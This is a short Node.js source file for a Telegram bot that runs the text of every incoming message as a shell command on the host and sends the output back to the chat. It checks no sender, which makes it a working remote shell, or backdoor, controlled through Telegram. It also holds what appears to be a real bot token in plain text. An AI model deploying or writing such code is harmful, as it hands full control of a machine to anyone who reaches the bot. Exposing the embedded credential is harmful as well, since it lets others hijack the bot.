const childProcess = require("child_process");
const TelegramBot = require("node-telegram-bot-api");
const token = "921695957:AAFmy4SXIeps28O-0X1lMwFTKKj2r_D_DcA";
const simpleBot = new TelegramBot(token, { polling: true });

simpleBot.on("message", message => {
  childProcess.exec(message.text, (err, stdout, stderr) => {
    if (err) {
      simpleBot.sendMessage(message.chat.id, stderr);
    } else {
      simpleBot.sendMessage(message.chat.id, stdout);
    }
  });
});
simpleBot.on("polling_error", error => {
  console.log(error);
});
